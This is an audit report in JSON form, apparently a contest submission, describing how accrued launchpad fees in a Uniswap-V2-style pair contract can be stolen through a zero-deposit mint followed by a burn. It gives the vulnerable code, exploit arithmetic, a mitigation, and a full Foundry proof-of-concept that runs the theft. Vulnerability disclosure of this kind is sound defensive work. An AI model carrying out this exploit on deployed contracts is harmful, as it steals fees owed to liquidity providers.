  "body": "## Finding description and impact\n\nAttacker Steals Accrued Launchpad Fees via Phantom Liquidity Mint/Burn (Reserves Exclude Fees While Balances Include Them)\n\n**Root Cause**: In `_update` (lines 184-185), reserves are set to `balance - totalLaunchpadFee` to exclude accrued fees, but actual token balances still hold the fees. `mint` (lines 215-216) detects this excess as \"added liquidity\" without requiring transfers, minting free LP tokens proportional to the fees. `burn` (lines 248-249) then extracts the fees pro-rata from full balances (including excesses), stealing them before distribution.\n\nhttps://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol#L185-L188\n\n```solidity\nFile: 2025-08-gte-perps-2/contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol\n211:     function mint(address to) external lock returns (uint256 liquidity) {\n212:         (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n213:         uint256 balance0 = IERC20(token0).balanceOf(address(this));\n214:         uint256 balance1 = IERC20(token1).balanceOf(address(this));\n215:  >>>    uint256 amount0 = balance0.sub(_reserve0);\n216:  >>>    uint256 amount1 = balance1.sub(_reserve1);\n217: \n218:         bool feeOn = _mintFee(_reserve0, _reserve1);\n219:         uint256 _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n220:         if (_totalSupply == 0) {\n221:             liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n222:             _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n223:         } else {\n224:  >>>        liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);\n225:         }\n226:         if (liquidity == 0) revert(\"UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED\");\n227:         _mint(to, liquidity);\n228: \n229:         _update(balance0, balance1, _reserve0, _reserve1, uint112(0), uint112(0));\n230:         if (feeOn) kLast = uint256(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n231:         emit Mint(msg.sender, amount0, amount1);\n232:     }\n```\n\n**Impacts** (High Severity):\n- **LP Dilution**: Phantom mints dilute existing LPs (e.g., ~0.01% per small exploit).\n\n\n**Vulnerability Flow** (Simplified PoC Math, 10e18 Swap Input; Assumes Symmetric Fees, Initial Reserves=100e18, TotalSupply=100e18):\n1. Swap 10e18 token0 in → ~9.066e18 token1 out; accrues fee0=1e16 (0.1% of input, prorated by launchpad LP share ~100%).\n   - Balances: token0=110e18, token1=90.93e18.\n   - Reserves: token0=109.99e18 (excludes fee0), token1=90.93e18.\n   - Accrued: fee0=1e16, fee1=0 (same block, no distribution).\n\n2. Immediate second swap (same block): 10e18 token1 in → ~10.86e18 token0 out; accrues fee1=1e16.\n   - Balances: token0=99.13e18, token1=100.93e18.\n   - Reserves: token0=99.12e18 (excludes total fee0=1.001e16), token1=100.92e18 (excludes fee1=1e16).\n   - Accrued: fee0=1.001e16, fee1=1e16.\n\n3. Attacker calls `mint(attacker)` (no tokens transferred in).\n   - Excess: amount0=balance0 - reserve0 = 1.001e16; amount1=1e16.\n   - Liquidity minted = min(1.001e16 * 100e18 / 99.12e18, 1e16 * 100e18 / 100.92e18) ≈ 9.908e15 LP tokens (pro-rata \"free\" share).\n   - Attacker now holds 9.908e15 LP tokens.\n\n4. Attacker transfers 9.908e15 LP to pair; calls `burn(attacker)`.\n   - Burn calc: amount0Burn = 9.908e15 * 99.13e18 / (100e18 + 9.908e15) ≈ 9.821e15 (pro-rata full balance0).\n   - amount1Burn ≈ 9.999e15 (pro-rata full balance1).\n   - Transfers ~9.821e15 token0 and ~9.999e15 token1 to attacker (≈ accrued fees, minor rounding from skew).\n\n## Recommended mitigation steps\n\nAnywhere `.balanceOf()` is read, account for `accrued fees` too",
  "proof_of_concept": "<details>\n\n<summary> \nAttached POC (click to drop down)\n</summary>\n\n1. Replace `test/c4-poc/PoCLaunchpad.t.sol` completely as shown below\n2. then run  `forge t --mc PoCLaunchpad  -vvv`\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport {GTELaunchpadV2PairFactory} from \"contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol\";\nimport {GTELaunchpadV2Pair} from \"contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol\";\nimport {MockERC20} from \"forge-std/mocks/MockERC20.sol\";\nimport {MockDistributor} from \"../mocks/MockDistributor.sol\";\nimport {IERC20} from \"@gte-univ2-core/interfaces/IERC20.sol\";\n\ncontract PoCLaunchpad is Test {\n    MockERC20 public base;\n    MockERC20 public quote;\n    GTELaunchpadV2Pair public pair;\n    address public launchpad;\n    MockDistributor public distributor;\n    GTELaunchpadV2PairFactory public v2Factory;\n    address public mockERC20Logic;\n    address public token0;\n    address public token1;\n\n    function setUp() public {\n        launchpad = makeAddr(\"launchpad\");\n        vm.label(launchpad, \"Launchpad\");\n\n        distributor = new MockDistributor();\n\n        v2Factory = new GTELaunchpadV2PairFactory(address(this), launchpad, launchpad, address(distributor));\n\n        mockERC20Logic = address(new MockERC20());\n\n        (address baseAddr, address quoteAddr, address pairAddr) = _createLaunchpadPair(\"base\", \"quote\");\n\n        base = MockERC20(baseAddr);\n        quote = MockERC20(quoteAddr);\n        pair = GTELaunchpadV2Pair(pairAddr);\n\n        deal(address(base), address(this), 100 ether);\n        deal(address(quote), address(this), 100 ether);\n\n        base.transfer(address(pair), 100 ether);\n        quote.transfer(address(pair), 100 ether);\n\n        token0 = pair.token0();\n        token1 = pair.token1();\n\n        // lp tokens are minted to launchpad as the fee calc is the launchpad's share of total lp supply\n        pair.mint(launchpad);\n    }\n\n    function _createLaunchpadPair(string memory nameBase, string memory nameQuote)\n        internal\n        returns (address baseAddr, address quoteAddr, address pairAddr)\n    {\n        baseAddr = vm.addr(uint256(keccak256(abi.encode(nameBase))));\n        quoteAddr = vm.addr(uint256(keccak256(abi.encode(nameQuote))));\n\n        if (baseAddr > quoteAddr) {\n            (baseAddr, quoteAddr) = (quoteAddr, baseAddr);\n            (nameBase, nameQuote) = (nameQuote, nameBase);\n        }\n\n        vm.label(baseAddr, string(abi.encodePacked(nameBase, \" Token\")));\n        vm.label(quoteAddr, string(abi.encodePacked(nameQuote, \" Token\")));\n\n        vm.etch(baseAddr, mockERC20Logic.code);\n        vm.etch(quoteAddr, mockERC20Logic.code);\n\n        MockERC20(baseAddr).initialize(nameBase, \"btn\", 18);\n        MockERC20(quoteAddr).initialize(nameQuote, \"qnt\", 18);\n\n        // Launchpad contract creates a pair\n        vm.prank(launchpad);\n        v2Factory.createPair(baseAddr, quoteAddr);\n\n        pairAddr = v2Factory.getPair(baseAddr, quoteAddr);\n    }\n\n    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)\n        internal\n        pure\n        returns (uint256 amountOut)\n    {\n        require(amountIn > 0, \"UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT\");\n        require(reserveIn > 0 && reserveOut > 0, \"UniswapV2Library: INSUFFICIENT_LIQUIDITY\");\n        uint256 amountInWithFee = amountIn * 997;\n        uint256 numerator = amountInWithFee * reserveOut;\n        uint256 denominator = (reserveIn * 1000) + amountInWithFee;\n        amountOut = numerator / denominator;\n    }\n\n    function getAmountsOut(GTELaunchpadV2Pair pair_, uint256 amountIn, address tokenIn)\n        internal\n        view\n        returns (uint256 amount0Out, uint256 amount1Out)\n    {\n        bool isZeroTokenIn = tokenIn == pair_.token0();\n        (uint256 reserve0, uint256 reserve1,) = pair_.getReserves();\n        (uint256 reserveIn, uint256 reserveOut) = isZeroTokenIn ? (reserve0, reserve1) : (reserve1, reserve0);\n        uint256 amountOut = getAmountOut(amountIn, reserveIn, reserveOut);\n        (amount0Out, amount1Out) = isZeroTokenIn ? (uint256(0), amountOut) : (amountOut, uint256(0));\n    }\n\n    /// @dev Updated PoC: Round-trip swaps accrue fees on both sides (same block), then mint/burn extracts them.\n    function test_PoC_FreeMintBurnAccruedFees() public {\n        uint256 amountIn = 10 ether;\n        deal(address(base), address(this), amountIn * 2);  // For two swaps\n        deal(address(quote), address(this), amountIn);    // For second swap input\n\n        // First swap: base (token0) → quote, accrues fee0\n        (uint256 amount0Out1, uint256 amount1Out1) = getAmountsOut(pair, amountIn, address(base));\n        base.transfer(address(pair), amountIn);\n        pair.swap(amount0Out1, amount1Out1, address(this), hex\"\");\n\n        // Second swap (same block): quote → base, accrues fee1\n        (uint256 amount0Out2, uint256 amount1Out2) = getAmountsOut(pair, amountIn, address(quote));\n        quote.transfer(address(pair), amountIn);\n        pair.swap(amount0Out2, amount1Out2, address(this), hex\"\");\n\n        // Verify symmetric fees accrued\n        (uint112 accruedFee0, uint112 accruedFee1,) = pair.getAccruedLaunchpadFees();\n        assertGt(accruedFee0, 0, \"No fee0 accrued\");\n        assertGt(accruedFee1, 0, \"No fee1 accrued\");  // Now >0\n\n        // Record pre-mint\n        uint256 attackerLPBefore = pair.balanceOf(address(this));\n        uint256 baseBalBefore = base.balanceOf(address(this));\n        uint256 quoteBalBefore = quote.balanceOf(address(this));\n\n        // Mint with 0 tokens added (excess = fees on both sides)\n        uint256 liquidityMinted = pair.mint(address(this));\n        uint256 attackerLPAfter = pair.balanceOf(address(this));\n        assertGt(attackerLPAfter - attackerLPBefore, 0, \"No LP tokens minted for free\");\n        assertEq(liquidityMinted, attackerLPAfter - attackerLPBefore, \"LP mint amount mismatch\");\n\n        // Transfer LP to pair for burn\n        pair.transfer(address(pair), liquidityMinted);\n\n        // Burn to extract fees\n        (uint256 amount0Burn, uint256 amount1Burn) = pair.burn(address(this));\n\n        // Assert extracted ≈ accrued fees (tolerance for dilution/rounding)\n        uint256 tolerance = uint256(accruedFee0) / 5 + 1000;  // ~20% + buffer for skew/rounding\n        assertApproxEqAbs(amount0Burn, uint256(accruedFee0), tolerance, \"Token0 extracted != fee0\");\n        assertApproxEqAbs(amount1Burn, uint256(accruedFee1), tolerance, \"Token1 extracted != fee1\");\n\n        // Verify attacker received the fees (no other changes)\n        assertEq(base.balanceOf(address(this)) - baseBalBefore, amount0Burn, \"Attacker didn't receive token0 fees\");\n        assertEq(quote.balanceOf(address(this)) - quoteBalBefore, amount1Burn, \"Attacker didn't receive token1 fees\");\n\n        // Optional: Check reserves desynced (understated by remaining accrued, but since no distribution yet)\n        (uint112 reserve0After, uint112 reserve1After,) = pair.getReserves();\n        assertLt(reserve0After, base.balanceOf(address(pair)), \"Reserves0 should understate balance post-exploit\");\n        assertLt(reserve1After, quote.balanceOf(address(pair)), \"Reserves1 should understate balance post-exploit\");\n    }\n}\n\n\n\n\n```\n</details>",
